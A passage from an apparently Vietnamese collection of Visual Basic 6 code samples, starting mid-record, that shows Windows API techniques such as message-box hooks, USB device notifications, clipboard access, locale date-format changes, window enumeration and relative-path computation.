Public Function CustomMsgBox(ByVal zMessage As String, Optional ByVal zButtons As VbMsgBoxStyle = vbOKOnly, Optional ByVal zTitle As String = vbNullString, Optional ByVal Button1Text As String = vbNullString, Optional ByVal Button2Text As String = vbNullString, Optional ByVal Button3Text As String = vbNullString) As VbMsgBoxResult
    Dim Thread As Long
    ButtonText(0) = Button1Text
    ButtonText(1) = Button2Text
    ButtonText(2) = Button3Text
    Thread = GetCurrentThreadId()
    hHook = SetWindowsHookEx(WH_CBT, AddressOf ChangeButtonsText, ByVal 0&amp;, Thread)
    If zTitle = vbNullString Then
        CustomMsgBox = MsgBox(zMessage, zButtons)
    Else
        CustomMsgBox = MsgBox(zMessage, zButtons, zTitle)
    End If
End Function

Public Function PasswordBox(ByVal zMessage As String, Optional ByVal zTitle As String = vbNullString, Optional ByVal zPasswordChar As Byte = 42) As String
    Dim Thread As Long
    PasswordChar = zPasswordChar
    Thread = GetCurrentThreadId()
    hHook = SetWindowsHookEx(WH_CBT, AddressOf SetPasswordChar, ByVal 0&amp;, Thread)
    If zTitle = vbNullString Then
        PasswordBox = InputBox(zMessage)
    Else
        PasswordBox = InputBox(zMessage, zTitle)
    End If
End Function

'--------Trong Form 
Private Sub Command1_Click()
    PasswordBox "Moi ban nhap mat khau ???", "Thong bao"
End Sub
Private Sub Command2_Click()
    CustomMsgBox "Thu cho biet -_-", vbDefaultButton2, "Test", "Dong y", "Huy bo"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>073831083819</MaVD>
    <NoiDung>'Form code
Option Explicit

'The RegisterDeviceNotification function registers the device or type of device for which a window will receive notifications
Private Declare Function RegisterDeviceNotification Lib "User32.dll" Alias _
    "RegisterDeviceNotificationA" (ByVal hRecipient As Long, _
    ByRef NotificationFilter As Any, ByVal Flags As Long) As Long
    
'The UnregisterDeviceNotification function closes the specified device notification handle
Private Declare Function UnregisterDeviceNotification Lib "User32.dll" ( _
    ByVal Handle As Long) As Long
    
'The DEV_BROADCAST_DEVICEINTERFACE structure contains information about a class of devices
Private Type DEV_BROADCAST_DEVICEINTERFACE
    dbcc_size As Long
    dbcc_devicetype As Long
    dbcc_reserved As Long
    dbcc_classguid As Guid
    dbcc_name As Long
End Type

'Return Value
Private lDevNotify As Long

'Handle to the window or service that will receive device events for the devices specified in the NotificationFilter parameter
Private Const DEVICE_NOTIFY_WINDOW_HANDLE As Long = &amp;H0
' Device interface class
Private Const DBT_DEVTYP_DEVICEINTERFACE As Long = &amp;H5

'Notifies the recipient of device interface events for all device interface classes.
Private Const DEVICE_NOTIFY_ALL_INTERFACE_CLASSES As Long = &amp;H4

Private Sub Form_Load()
    Dim NotifFilter As DEV_BROADCAST_DEVICEINTERFACE

    With NotifFilter
    'Size of this structure, in bytes.
        .dbcc_size = Len(NotifFilter)
        
        'Class of devices. This structure is a DEV_BROADCAST_DEVICEINTERFACE structure.
        .dbcc_devicetype = DBT_DEVTYP_DEVICEINTERFACE
    End With

    Call SubClass(Me.hWnd)
    
    lDevNotify = RegisterDeviceNotification(Me.hWnd, NotifFilter, _
        DEVICE_NOTIFY_WINDOW_HANDLE Or DEVICE_NOTIFY_ALL_INTERFACE_CLASSES)
        
End Sub

Private Sub Form_Unload(ByRef Cancel As Integer)
    Call UnregisterDeviceNotification(lDevNotify)
    Call UnSubClass
End Sub


'Module code:
Option Explicit

'The SetWindowLong function changes an attribute of the specified window.
'The function also sets the 32-bit (long) value at the specified offset into the extra window memory.
Private Declare Function SetWindowLong Lib "User32.dll" Alias "SetWindowLongA" ( _
    ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
    
'The CallWindowProc function passes message information to the specified window procedure
Private Declare Function CallWindowProc Lib "User32.dll" Alias "CallWindowProcA" ( _
    ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, _
    ByVal wParam As Long, ByVal lParam As Long) As Long

'This function converts a globally unique identifier (GUID) into a string of printable characters.
Private Declare Function StringFromGUID2 Lib "OLE32.dll" ( _
    ByRef rGUID As Any, ByVal lpSz As String, ByVal cchMax As Long) As Long
    
'Convert API Calls from 16-bit to 32-bit
Private Declare Function lstrcpyA Lib "Kernel32.dll" (ByVal lpString1 As String, ByVal lpString2 As Long) As Long
Private Declare Function lstrlenA Lib "Kernel32.dll" (ByVal lpString As Long) As Long

'The GetDriveType function determines whether a disk drive is a removable, fixed, CD-ROM, RAM disk, or network drive
Private Declare Function GetDriveType Lib "Kernel32.dll" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long

'The RtlMoveMemory routine moves memory either forward or backward,
'aligned or unaligned, in 4-byte blocks, followed by any remaining bytes
Private Declare Sub RtlMoveMemory Lib "Kernel32.dll" ( _
    ByRef Destination As Any, ByRef Source As Any, ByVal Length As Long)
    
'The GetDWORD method retrieves a DWORD property
Private Declare Sub GetDWord Lib "MSVBVM60.dll" Alias "GetMem4" (ByRef inSrc As Any, ByRef inDst As Long)

' GetWORD method retrieves a WORD property
Private Declare Sub GetWord Lib "MSVBVM60.dll" Alias "GetMem2" (ByRef inSrc As Any, ByRef inDst As Integer)

'The DEV_BROADCAST_HDR structure is a standard header for information related to a device event reported
'through the WM_DEVICECHANGE message
Private Type DEV_BROADCAST_HDR
    dbch_size As Long
    dbch_devicetype As Long
    dbch_reserved As Long
End Type

'Used with the GUIDString Function ( GUID = Globally Unique Identifier )
Public Type Guid
    D1 As Long
    D2 As Integer
    D3 As Integer
    D4(7) As Byte
End Type

Dim OldProc As Long
'Window handle
Dim WHnd As Long

'use the GWL_WNDPROC constant to tell the SetWindowLong function that you
'want to change the address of the target window's WindowProc function
Private Const GWL_WNDPROC As Long = (-4)

'The WM_DEVICECHANGE device message notifies an application of a change to the hardware
'configuration of a device or the computer
Private Const WM_DEVICECHANGE As Long = &amp;H219

'The system broadcasts the DBT_DEVNODES_CHANGED device event when a device has been added to or removed from the system
Private Const DBT_DEVNODES_CHANGED As Long = &amp;H7

'The system broadcasts the DBT_DEVICEARRIVAL device event when a device or piece of media has been inserted and becomes available
Private Const DBT_DEVICEARRIVAL As Long = &amp;H8000&amp;

'The system broadcasts the DBT_DEVICEREMOVECOMPLETE device event when a device or piece of media has been physically removed
Private Const DBT_DEVICEREMOVECOMPLETE As Long = &amp;H8004&amp;

'The application must check the event to ensure that the type of device arriving is a volume
Private Const DBT_DEVTYP_VOLUME As Long = &amp;H2 ' Logical volume
Private Const DBT_DEVTYP_DEVICEINTERFACE As Long = &amp;H5 ' Device interface class

Private Const DBTF_MEDIA As Long = &amp;H1 ' Media comings and goings
Private Const DBTF_NET As Long = &amp;H2 ' Network volume

'No Root Directory
Private Const DRIVE_NO_ROOT_DIR As Long = 1

'Removeable drive
Private Const DRIVE_REMOVABLE As Long = 2

'fixed drive ( not removeable )
Private Const DRIVE_FIXED As Long = 3

'remote drive ( network )
Private Const DRIVE_REMOTE As Long = 4

'CD rom
Private Const DRIVE_CDROM As Long = 5

'RAM disk ( USB stick )
Private Const DRIVE_RAMDISK As Long = 6

Public Sub SubClass(ByVal iWnd As Long)
    If (WHnd) Then Call UnSubClass

    OldProc = SetWindowLong(iWnd, GWL_WNDPROC, AddressOf WndProc)
    WHnd = iWnd
End Sub

Public Sub UnSubClass()
    If (WHnd = 0) Then Exit Sub
    Call SetWindowLong(WHnd, GWL_WNDPROC, OldProc)

    WHnd = 0
    OldProc = 0
End Sub

Private Function WndProc(ByVal hWnd As Long, ByVal uMsg As Long, _
    ByVal wParam As Long, ByVal lParam As Long) As Long
    Dim DevBroadcastHead As DEV_BROADCAST_HDR
    Dim UMask As Long, Flags As Integer

    If (uMsg = WM_DEVICECHANGE) Then
        Select Case wParam
            Case DBT_DEVICEARRIVAL, DBT_DEVICEREMOVECOMPLETE
                Call RtlMoveMemory(DevBroadcastHead, ByVal lParam, Len(DevBroadcastHead))

                If (DevBroadcastHead.dbch_devicetype = DBT_DEVTYP_VOLUME) Then
                    Call GetDWord(ByVal (lParam + Len(DevBroadcastHead)), UMask)
                    Call GetWord(ByVal (lParam + Len(DevBroadcastHead) + 4), Flags)

                    MsgBox "Drive(s): " &amp; UMaskString(UMask) &amp; " " &amp; _
                        IIf(wParam = DBT_DEVICEARRIVAL, "Inserted", "Ejected")
                End If

        End Select
    End If

    WndProc = CallWindowProc(OldProc, hWnd, uMsg, wParam, lParam)
End Function

Public Function CopyString(ByVal lPtr As Long) As String
    Dim BufferLen As Long

    BufferLen = lstrlenA(lPtr)

    If (BufferLen &gt; 0) Then
        CopyString = Space$(BufferLen)
        Call lstrcpyA(CopyString, lPtr)
    End If
End Function

Private Function DriveTypeString(ByVal lDriveType As Long) As String
    Select Case lDriveType
        Case DRIVE_NO_ROOT_DIR: DriveTypeString = "No root directory"
        Case DRIVE_REMOVABLE:   DriveTypeString = "Removable"
        Case DRIVE_FIXED:       DriveTypeString = "Fixed"
        Case DRIVE_REMOTE:      DriveTypeString = "Remote"
        Case DRIVE_CDROM:       DriveTypeString = "CD-ROM"
        Case DRIVE_RAMDISK:     DriveTypeString = "RAM disk"
        Case Else:              DriveTypeString = "[ Unknown ]"
    End Select
End Function

Private Function UMaskString(ByVal iUnitMask As Long) As String
    Dim Bits As Long

    For Bits = 0 To 30
        If (iUnitMask And (2 ^ Bits)) Then _
            UMaskString = UMaskString &amp; Chr$(Asc("A") + Bits)
    Next Bits
End Function


Private Function GUIDString(ByRef inGUID As Guid) As String
    Dim RetBuffer As String, GUILen As Long

    Const BufferLen As Long = 80

    RetBuffer = Space$(BufferLen)
    GUILen = StringFromGUID2(inGUID, RetBuffer, BufferLen)

    If (GUILen) Then GUIDString = StrConv(Left$(RetBuffer, (GUILen - 1) * 2), vbFromUnicode)
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>071817121808</MaVD>
    <NoiDung>Option Explicit
 
Private Const CF_UNICODETEXT As Long = 13
Private Const GMEM_MOVEABLE As Long = &amp;H2
Private Const GMEM_ZEROINIT As Long = &amp;H40
 
Private Declare Function OpenClipboard Lib "user32.dll" (ByVal hWnd As Long) As Long
Private Declare Function CloseClipboard Lib "user32.dll" () As Long
Private Declare Function GetClipboardData Lib "user32.dll" (ByVal wFormat As Long) As Long
Private Declare Function SetClipboardData Lib "user32.dll" (ByVal wFormat As Long, ByVal hMem As Long) As Long
Private Declare Function EmptyClipboard Lib "user32.dll" () As Long
Private Declare Function IsClipboardFormatAvailable Lib "user32.dll" (ByVal wFormat As Long) As Long
Private Declare Function lstrcpy Lib "kernel32.dll" Alias "lstrcpyW" (ByVal lpString1 As Long, ByVal lpString2 As Long) As Long
Private Declare Function GlobalAlloc Lib "kernel32.dll" (ByVal wFlags As Long, ByVal dwBytes As Long) As Long
Private Declare Function GlobalLock Lib "kernel32.dll" (ByVal hMem As Long) As Long
Private Declare Function GlobalUnlock Lib "kernel32.dll" (ByVal hMem As Long) As Long
Private Declare Function GlobalSize Lib "kernel32" (ByVal hMem As Long) As Long
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByRef lParam As Any) As Long
 
Private Const WM_COPY As Long = &amp;H301
Private Const WM_PASTE As Long = &amp;H302
 
Private Function Get_clipboard() As String
    Dim myStrPtr As Long, myLen As Long, myLock As Long, myData As String
    
    OpenClipboard 0&amp;
    
    If IsClipboardFormatAvailable(CF_UNICODETEXT) = 0 Then MsgBox "Clipboard Text is not available now": Exit Function
    
    myStrPtr = GetClipboardData(CF_UNICODETEXT)
    
    If myStrPtr = 0 Then
        MsgBox "Failed to get Clipboard Text"
    Else
        myLock = GlobalLock(myStrPtr)
        myLen = GlobalSize(myStrPtr)
        myData = String$(myLen \ 2 - 1, vbNullChar)
        lstrcpy StrPtr(myData), myLock
        GlobalUnlock myStrPtr
    End If
    
    CloseClipboard
    
    Get_clipboard = myData
End Function
 
Private Sub Set_clipboard(s As String)
    Dim myStrPtr As Long, myLen As Long, myLock As Long
    
    OpenClipboard 0&amp;
    EmptyClipboard
    
    myLen = LenB(s) + 2
    myStrPtr = GlobalAlloc(GMEM_MOVEABLE Or GMEM_ZEROINIT, myLen)
    myLock = GlobalLock(myStrPtr)
    lstrcpy myLock, StrPtr(s)
    GlobalUnlock myStrPtr
    
    SetClipboardData CF_UNICODETEXT, myStrPtr
    If IsClipboardFormatAvailable(CF_UNICODETEXT) = 0 Then MsgBox "Failed to set Clipboard Text"
    CloseClipboard
End Sub
 
Public Sub Set_Text(hWnd As Long, sUni As String)
    Set_clipboard sUni
    SendMessage hWnd, WM_PASTE, 0, 0
End Sub
 
Public Function Get_Text(TextBoxVB As TextBox) As String
    Dim i As Integer
    With TextBoxVB
        i = .SelStart
        .SelStart = 0
        .SelLength = Len(.Text)
        SendMessage .hWnd, WM_COPY, 0, 0
        .SelStart = i
        Get_Text = Get_clipboard
    End With
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>072203112204</MaVD>
    <NoiDung>'Module code:
Option Explicit

Public Const LOCALE_SLANGUAGE As Long = &amp;H2
Public Const LOCALE_SSHORTDATE As Long = &amp;H1F

Public Const DATE_LONGDATE As Long = &amp;H2
Public Const DATE_SHORTDATE As Long = &amp;H1

Public Const HWND_BROADCAST As Long = &amp;HFFFF&amp;
Public Const WM_SETTINGCHANGE As Long = &amp;H1A

Public Declare Function PostMessage Lib "user32" _
   Alias "PostMessageA" _
  (ByVal hwnd As Long, _
   ByVal wMsg As Long, _
   ByVal wParam As Long, _
   lParam As Any) As Long

Public Declare Function EnumDateFormats Lib "kernel32" _
   Alias "EnumDateFormatsA" _
  (ByVal lpDateFmtEnumProc As Long, _
   ByVal Locale As Long, _
   ByVal dwFlags As Long) As Long

Public Declare Sub CopyMemory Lib "kernel32" _
   Alias "RtlMoveMemory" _
  (Destination As Any, _
   Source As Any, _
   ByVal Length As Long)

Public Declare Function GetSystemDefaultLCID Lib "kernel32" () As Long

Public Declare Function GetLocaleInfo Lib "kernel32" _
   Alias "GetLocaleInfoA" _
  (ByVal Locale As Long, _
   ByVal LCType As Long, _
   ByVal lpLCData As String, _
   ByVal cchData As Long) As Long

Public Declare Function SetLocaleInfo Lib "kernel32" _
    Alias "SetLocaleInfoA" _
   (ByVal Locale As Long, _
    ByVal LCType As Long, _
    ByVal lpLCData As String) As Long

Public Function fGetUserLocaleInfo(ByVal lLocaleID As Long, _
            ByVal lLCType As Long) As String
    Dim sReturn As String
    Dim lReturn As Long
    lReturn = GetLocaleInfo(lLocaleID, lLCType, sReturn, Len(sReturn))
    If lReturn Then
    
        sReturn = Space$(lReturn)
        If lReturn Then
            fGetUserLocaleInfo = Left$(sReturn, lReturn - 1)
        End If
    End If
End Function

Public Function theEnumDates(lDateFormatString As Long) As Long
    theEnumDates = 1
End Function

Private Function GetStrFromPointer(sString As Long) As String
    Dim lPos    As Long
    Dim sBuffer As String
    sBuffer = Space$(128)
    Call CopyMemory(ByVal sBuffer, sString, ByVal Len(sBuffer))
    lPos = InStr(sBuffer, Chr$(0))
    
    If lPos Then
        GetStrFromPointer = Left$(sBuffer, lPos - 1)
    End If
End Function

'Form code:
Option Explicit

Private Sub Command1_Click()
    Dim xCID      As Long
    Dim xChangedFormat As String
    
    xCID = GetSystemDefaultLCID()
    xChangedFormat = "dd-MMM-yy"
    
    If xChangedFormat &lt;&gt; "" Then
    
        Call SetLocaleInfo(xCID, LOCALE_SSHORTDATE, xChangedFormat)
        
        Call EnumDateFormats(AddressOf theEnumDates, xCID, DATE_SHORTDATE)
    End If
End Sub


Private Sub Command2_Click()
    Dim xCID      As Long
    Dim xChangedFormat As String
    
    xCID = GetSystemDefaultLCID()
    
    xChangedFormat = "dd/MM/yyy"
    
    If xChangedFormat &lt;&gt; "" Then
    
        Call SetLocaleInfo(xCID, LOCALE_SSHORTDATE, xChangedFormat)
    
        Call PostMessage(HWND_BROADCAST, WM_SETTINGCHANGE, 0&amp;, ByVal 0&amp;)
    
        Call EnumDateFormats(AddressOf theEnumDates, xCID, DATE_SHORTDATE)
    End If
End Sub

Private Sub Command3_Click()
    MsgBox Date, vbInformation, "www.netnet.ca"
End Sub

Private Sub Form_Load()
    Command1.Caption = "Change TO dd-MMM-yy"
    Command2.Caption = "Change TO dd/MM/yyy"
    Command3.Caption = "View Date"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605142336360841</MaVD>
    <NoiDung>Private Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
Private Declare Function GetTempPath Lib "kernel32" Alias "GetTempPathA" (ByVal nBufferLength As Long, ByVal lpBuffer As String) As Long
Private Sub Form_Load()
    Dim strTemp As String, strUserName As String
    'Create a buffer
    strTemp = String(100, Chr$(0))
    'Get the temporary path
    GetTempPath 100, strTemp
    'strip the rest of the buffer
    strTemp = Left$(strTemp, InStr(strTemp, Chr$(0)) - 1)

    'Create a buffer
    strUserName = String(100, Chr$(0))
    'Get the username
    GetUserName strUserName, 100
    'strip the rest of the buffer
    strUserName = Left$(strUserName, InStr(strUserName, Chr$(0)) - 1)

    'Show the temppath and the username
    MsgBox "Hello " + strUserName + Chr$(13) + "The temp. path is " + strTemp
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074811104842</MaVD>
    <NoiDung>'Module code:
Option Explicit

Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hWnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

Public Const GWL_WNDPROC = (-4) ' This we recognize as the constant for accessing the callback address

Public lngOldProc As Long ' This is for preserving the old address of the callback

Public Function myWindowProc(ByVal hWnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

    myWindowProc = CallWindowProc(lngOldProc, hWnd, Msg, wParam, lParam)
    'Your code here

End Function


'Form code:
Private Sub Form_Load()
    ' lngOldProc now holds the old addrss of the callback function.
     lngOldProc = SetWindowLong (Me.hwnd, GWL_WNDPROC, AddressOf myWindowProc)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070011110002</MaVD>
    <NoiDung>Option Explicit

Const CDERR_DIALOGFAILURE = &amp;HFFFF
Const CDERR_FINDRESFAILURE = &amp;H6
Const CDERR_GENERALCODES = &amp;H0
Const CDERR_INITIALIZATION = &amp;H2
Const CDERR_LOADRESFAILURE = &amp;H7
Const CDERR_LOADSTRFAILURE = &amp;H5
Const CDERR_LOCKRESFAILURE = &amp;H8
Const CDERR_MEMALLOCFAILURE = &amp;H9
Const CDERR_MEMLOCKFAILURE = &amp;HA
Const CDERR_NOHINSTANCE = &amp;H4
Const CDERR_NOHOOK = &amp;HB
Const CDERR_REGISTERMSGFAIL = &amp;HC
Const CDERR_NOTEMPLATE = &amp;H3
Const CDERR_STRUCTSIZE = &amp;H1
Private Declare Function GetOpenFileName Lib "comdlg32.dll" Alias "GetOpenFileNameA" (pOpenfilename As Any) As Long
Private Declare Function CommDlgExtendedError Lib "comdlg32.dll" () As Long

Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'We're letting the GetOpenFileName-function crash
    GetOpenFileName ByVal 0&amp;
    Select Case CommDlgExtendedError
        Case CDERR_DIALOGFAILURE
            MsgBox "The dialog box could not be created."
        Case CDERR_FINDRESFAILURE
            MsgBox "The common dialog box function failed to find a specified resource."
        Case CDERR_INITIALIZATION
            MsgBox "The common dialog box function failed during initialization."
        Case CDERR_LOADRESFAILURE
            MsgBox "The common dialog box function failed to load a specified resource."
        Case CDERR_LOADSTRFAILURE
            MsgBox "The common dialog box function failed to load a specified string."
        Case CDERR_LOCKRESFAILURE
            MsgBox "The common dialog box function failed to lock a specified resource."
        Case CDERR_MEMALLOCFAILURE
            MsgBox "The common dialog box function was unable to allocate memory for internal structures."
        Case CDERR_MEMLOCKFAILURE
            MsgBox "The common dialog box function was unable to lock the memory associated with a handle."
        Case CDERR_NOHINSTANCE
            MsgBox "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box, but you failed to provide a corresponding instance handle."
        Case CDERR_NOHOOK
            MsgBox "The ENABLEHOOK flag was set in the Flags member of the initialization structure for the corresponding common dialog box, but you failed to provide a pointer to a corresponding hook procedure."
        Case CDERR_REGISTERMSGFAIL
            MsgBox "The RegisterWindowMessage function returned an error code when it was called by the common dialog box function."
        Case CDERR_NOTEMPLATE
            MsgBox "The ENABLETEMPLATE flag was set in the Flags member of the initialization structure for the corresponding common dialog box, but you failed to provide a corresponding template."
        Case CDERR_STRUCTSIZE
            MsgBox "The lStructSize member of the initialization structure for the corresponding common dialog box is invalid."
        Case Else
            MsgBox "Undefined error ..."
    End Select
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075411115439</MaVD>
    <NoiDung>Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Long) As Long
Private Declare Function DefWindowProc Lib "user32" Alias "DefWindowProcA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
Const WM_SETHOTKEY = &amp;H32
Const WM_SHOWWINDOW = &amp;H18
Const HK_SHIFTA = &amp;H141 'Shift + A
Const HK_SHIFTB = &amp;H142 'Shift + B
Const HK_CONTROLA = &amp;H241 'Control + A
Const HK_ALTZ = &amp;H45A
'The value of the key-combination has to
'declared in lowbyte/highbyte-format
'That means as a hex-number: the last two
'characters specify the lowbyte (e.g.: 41 = a),
'the first the highbyte (e.g.: 01 = 1 = Shift)
Private Sub Form_Load()
    'KPD-Team 1999
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Me.WindowState = vbMinimized
    'Let windows know what hotkey you want for
    'your app, setting of lParam has no effect
    'Đặt phím tắt cho cửa sổ là ALT + A
    'Mỗi khi bạn nhấn ALT + A, cửa sổ sẽ hiện lên
    erg&amp; = SendMessage(Me.hwnd, WM_SETHOTKEY, HK_ALTZ, 0)
    'Check if succesfull
    If erg&amp; &lt;&gt; 1 Then
    MsgBox "You need another hotkey", vbOKOnly, "Error"
    End If
    'Tell windows what it should do, when the hotkey
    'is pressed -&gt; show the window!
    'The setting of wParam and lParam has no effect
    erg&amp; = DefWindowProc(Me.hwnd, WM_SHOWWINDOW, 0, 0)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075911115911</MaVD>
    <NoiDung>'in a form
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Me.AutoRedraw = True
    EnumChildWindows GetDesktopWindow, AddressOf EnumChildProc, ByVal 0&amp;
End Sub
'in a module
Declare Function GetDesktopWindow Lib "user32" () As Long
Declare Function EnumChildWindows Lib "user32" (ByVal hWndParent As Long, ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Function EnumChildProc(ByVal hwnd As Long, ByVal lParam As Long) As Long
    Dim sSave As String
    'Get the windowtext length
    sSave = Space$(GetWindowTextLength(hwnd) + 1)
    'get the window text
    GetWindowText hwnd, sSave, Len(sSave)
    'remove the last Chr$(0)
    sSave = Left$(sSave, Len(sSave) - 1)
    If sSave &lt;&gt; "" Then Form1.Print sSave
    'continue enumeration
    EnumChildProc = 1
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070212120231</MaVD>
    <NoiDung>'in a form
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    Dim ThreadID As Long, ProcessID As Long  ' receive id to thread and process of Form1
    ' Determine the thread which owns this window
    ThreadID = GetWindowThreadProcessId(Me.hWnd, ProcessID)
    ' Use the callback function to list all of the enumerated thrad windows
    EnumThreadWindows ThreadID, AddressOf EnumThreadWndProc, 0
    'Show the results
    Me.AutoRedraw = True
    Me.Print sClasses
End Sub

'In a module
Declare Function GetWindowThreadProcessId Lib "user32" (ByVal hWnd As Long, lpdwProcessId As Long) As Long
Declare Function EnumThreadWindows Lib "user32" (ByVal dwThreadId As Long, ByVal lpfn As Long, ByVal lParam As Long) As Long
Declare Function GetClassName Lib "user32" Alias "GetClassNameA" (ByVal hWnd As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
'variable used to list all the classnames
Public sClasses As String
Public Function EnumThreadWndProc(ByVal hWnd As Long, ByVal lParam As Long) As Long
    Dim Ret As Long, sText As String
    'create a string-buffer
    sText = Space(255)
    'get the classname of the window handle
    Ret = GetClassName(hWnd, sText, 255)
    'cut off the unnecessary part of Chr$(0)'s
    sText = Left$(sText, Ret)
    'add this classname to the list of classnames
    sClasses = sClasses + sText + vbCrLf
    'continue the enumeration
    EnumThreadWndProc = 1
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070412120404</MaVD>
    <NoiDung>'Add this code to a form
Private Sub Form_Load()
    'KPD-Team 2000
    'URL: http://www.allapi.net/
    'E-Mail: KPDTeam@Allapi.net
    'Set the form's graphics mode to persistent
    Me.AutoRedraw = True
    'call the Enumwindows-function
    EnumWindows AddressOf EnumWindowsProc, ByVal 0&amp;
End Sub

'Add this code to a module
Declare Function EnumWindows Lib "user32" (ByVal lpEnumFunc As Long, ByVal lParam As Long) As Boolean
Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" (ByVal hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Declare Function GetWindowTextLength Lib "user32" Alias "GetWindowTextLengthA" (ByVal hwnd As Long) As Long
Public Function EnumWindowsProc(ByVal hwnd As Long, ByVal lParam As Long) As Boolean
    Dim sSave As String, Ret As Long
    Ret = GetWindowTextLength(hwnd)
    sSave = Space(Ret)
    GetWindowText hwnd, sSave, Ret + 1
    Form1.Print Str$(hwnd) + " " + sSave
    'continue enumeration
    EnumWindowsProc = True
End Function</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074613104631</MaVD>
    <NoiDung>Private Sub Command1_Click()
    'Creating a Desktop Shortcut to a Web Site
    Dim sUrl As String
    Dim sFile As String
    Dim lFile As Long
    
    lFile = FreeFile
    sUrl = "URL=http://www.caulacbovb.com"

    sFile = "C:\caulacbovb.url"
    
    Open sFile For Output As lFile
    Print #lFile, "[InternetShortcut]"
    Print #lFile, sUrl
    Close lFile
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075913105928</MaVD>
    <NoiDung>Private Enum StandardIconEnum
    IDI_ASTERISK = 32516&amp;
    IDI_EXCLAMATION = 32515&amp;
    IDI_HAND = 32513&amp;
    IDI_QUESTION = 32514
End Enum

Private Declare Function LoadStandardIcon Lib "user32" _
    Alias "LoadIconA" (ByVal hInstance As Long, _
    ByVal lpIconNum As StandardIconEnum) As Long

Private Declare Function DrawIcon Lib "user32" _
    (ByVal hdc As Long, ByVal x As Long, ByVal y As Long, _
    ByVal hIcon As Long) As Long


Private Sub Command1_Click()
    Dim lIcon As Long
    Me.Cls
    lIcon = LoadStandardIcon(0&amp;, StandardIconEnum.IDI_EXCLAMATION)
    Call DrawIcon(Me.hdc, 10&amp;, 10&amp;, lIcon)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>071013111055</MaVD>
    <NoiDung>Private Type udtType
      SubVariable1 As Integer
      SubVariable2 As String
      SubVariable3 As Long
End Type
'
' Dim variables of this type.
'
Dim TypeVar1 As udtType
Dim TypeVar2 As udtType
'
' A method in a class which clears the structure variable.
'
Private Sub ClearData()
    Dim EmptyVar As udtType
    
    TypeVar1 = EmptyVar
    TypeVar2 = EmptyVar
End Sub

Private Sub Command1_Click()
    ClearData
    MsgBox TypeVar1.SubVariable2
End Sub

Private Sub Form_Load()
    TypeVar1.SubVariable1 = 9999
    TypeVar1.SubVariable2 = "caulacbovb.com"
    TypeVar1.SubVariable3 = 999999
    
    TypeVar2.SubVariable1 = 1111
    TypeVar2.SubVariable2 = "caulacbovb.net"
    TypeVar2.SubVariable3 = 999999
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000025</MaVD>
    <NoiDung>Option Explicit
Private Sub Form_Load()
Dim MyDouble, MyCurr
    MyDouble = 543.214588   ' Khoi tao
    MyCurr = CCur(MyDouble * 2)   ' Chuyen doi MyDouble * 2
    ' Returns (1086.429176) to a Currency (1086.4292).
End Sub
</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>072713122730</MaVD>
    <NoiDung>Private Declare Function PathRelativePathTo Lib "shlwapi.dll" Alias "PathRelativePathToW" ( _
     ByVal pszPath As Long, _
     ByVal pszFrom As Long, _
     ByVal dwAttrFrom As Long, _
     ByVal pszTo As Long, _
     ByVal dwAttrTo As Long) As Long
     
Private Function GetRelativePath(ByRef strRelativepath As String, _
      ByVal strPathFrom As String, ByVal strPathTo As String) As Boolean

Dim blnResult As Boolean
Const MAX_PATH = 260

strRelativepath = Space$(MAX_PATH)
'
' Set dwAttr... to vbDirectory for directories,
' or 0 for files.
'
blnResult = PathRelativePathTo(StrPtr(strRelativepath), _
StrPtr(strPathFrom), vbDirectory, StrPtr(strPathTo), 0)

If blnResult Then
      strRelativepath = Left(strRelativepath, InStr(strRelativepath, vbNullChar) - 1)
Else
      strRelativepath = ""
End If

GetRelativePath = blnResult
End Function
